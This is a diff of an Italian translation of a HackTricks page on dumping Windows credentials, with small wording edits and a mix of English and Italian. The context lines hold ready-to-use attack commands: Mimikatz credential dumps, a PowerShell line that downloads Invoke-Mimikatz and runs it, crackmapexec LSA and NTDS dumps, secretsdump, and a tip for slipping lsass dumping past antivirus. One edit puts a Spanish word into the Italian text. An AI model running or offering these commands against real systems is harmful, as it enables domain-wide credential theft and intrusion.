@@ -8,14 +8,14 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 
 <summary>Support HackTricks</summary>
 
-* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
-* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos su github.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
 
-## Credentials Mimikatz
+## Credenziali Mimikatz
 ```bash
 #Elevate Privileges to extract the credentials
 privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
@@ -37,7 +37,7 @@ IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercont
 Invoke-Mimikatz -DumpCreds #Dump creds from memory
 Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
 ```
-[**Scopri alcune possibili protezioni delle credenziali qui.**](credentials-protections.md) **Queste protezioni potrebbero impedire a Mimikatz di estrarre alcune credenziali.**
+[**Scopri alcune possibili protezioni per le credenziali qui.**](credentials-protections.md) **Queste protezioni potrebbero impedire a Mimikatz di estrarre alcune credenziali.**
 
 ## Credenziali con Meterpreter
 
@@ -86,7 +86,7 @@ mimikatz # sekurlsa::logonPasswords
 
 Questo processo viene eseguito automaticamente con [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
 
-**Nota**: Alcuni **AV** potrebbero **rilevare** come **maligni** l'uso di **procdump.exe per dumpare lsass.exe**, questo perché stanno **rilevando** la stringa **"procdump.exe" e "lsass.exe"**. Quindi è **più furtivo** **passare** come **argomento** il **PID** di lsass.exe a procdump **invece di** usare il **nome lsass.exe.**
+**Nota**: Alcuni **AV** potrebbero **rilevare** come **malicioso** l'uso di **procdump.exe per dumpare lsass.exe**, questo perché stanno **rilevando** la stringa **"procdump.exe" e "lsass.exe"**. Quindi è **più furtivo** **passare** come **argomento** il **PID** di lsass.exe a procdump **invece di** usare il **nome lsass.exe.**
 
 ### Dumping lsass con **comsvcs.dll**
 
@@ -146,7 +146,7 @@ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
 cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 #~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
 ```
-### Dump della cronologia delle password NTDS.dit dal DC di destinazione
+### Dumpare la cronologia delle password NTDS.dit dal DC di destinazione
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
 ```
@@ -156,7 +156,7 @@ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 ```
 ## Stealing SAM & SYSTEM
 
-Questi file dovrebbero essere **posizionati** in _C:\windows\system32\config\SAM_ e _C:\windows\system32\config\SYSTEM._ Ma **non puoi semplicemente copiarli in un modo normale** perché sono protetti.
+Questi file dovrebbero essere **posizionati** in _C:\windows\system32\config\SAM_ e _C:\windows\system32\config\SYSTEM._ Ma **non puoi semplicemente copiarli in modo regolare** perché sono protetti.
 
 ### From Registry
 
@@ -211,13 +211,13 @@ Il file **NTDS.dit** è conosciuto come il cuore di **Active Directory**, conten
 
 All'interno di questo database, vengono mantenute tre tabelle principali:
 
-- **Tabella Dati**: Questa tabella è incaricata di memorizzare dettagli sugli oggetti come utenti e gruppi.
+- **Tabella Dati**: Questa tabella è incaricata di memorizzare i dettagli sugli oggetti come utenti e gruppi.
 - **Tabella Link**: Tiene traccia delle relazioni, come le appartenenze ai gruppi.
 - **Tabella SD**: Qui sono conservati i **descrittori di sicurezza** per ogni oggetto, garantendo la sicurezza e il controllo degli accessi per gli oggetti memorizzati.
 
 Ulteriori informazioni su questo: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)
 
-Windows utilizza _Ntdsa.dll_ per interagire con quel file ed è utilizzato da _lsass.exe_. Quindi, **parte** del file **NTDS.dit** potrebbe trovarsi **all'interno della memoria `lsass`** (puoi trovare i dati più recentemente accessi probabilmente a causa del miglioramento delle prestazioni utilizzando una **cache**).
+Windows utilizza _Ntdsa.dll_ per interagire con quel file ed è utilizzato da _lsass.exe_. Quindi, **parte** del file **NTDS.dit** potrebbe trovarsi **all'interno della memoria `lsass`** (puoi trovare i dati più recentemente accessibili probabilmente a causa del miglioramento delle prestazioni utilizzando una **cache**).
 
 #### Decrittazione degli hash all'interno di NTDS.dit
 
@@ -247,13 +247,13 @@ Puoi anche **estrarli automaticamente** utilizzando un utente admin di dominio v
 ```
 secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
 ```
-Per **grandi file NTDS.dit** è consigliato estrarli utilizzando [gosecretsdump](https://github.com/c-sto/gosecretsdump).
+Per **grandi file NTDS.dit** si consiglia di estrarli utilizzando [gosecretsdump](https://github.com/c-sto/gosecretsdump).
 
 Infine, puoi anche utilizzare il **modulo metasploit**: _post/windows/gather/credentials/domain\_hashdump_ o **mimikatz** `lsadump::lsa /inject`
 
 ### **Estrazione degli oggetti di dominio da NTDS.dit a un database SQLite**
 
-Gli oggetti NTDS possono essere estratti in un database SQLite con [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Non solo vengono estratti segreti, ma anche gli oggetti interi e i loro attributi per ulteriori estrazioni di informazioni quando il file NTDS.dit grezzo è già stato recuperato.
+Gli oggetti NTDS possono essere estratti in un database SQLite con [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Non solo vengono estratti i segreti, ma anche gli oggetti interi e i loro attributi per ulteriori estrazioni di informazioni quando il file NTDS.dit grezzo è già stato recuperato.
 ```
 ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
 ```
@@ -304,7 +304,7 @@ Impara e pratica il hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" dat
 
 * Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
 * **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos su github.
+* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.
 
 </details>
 {% endhint %}
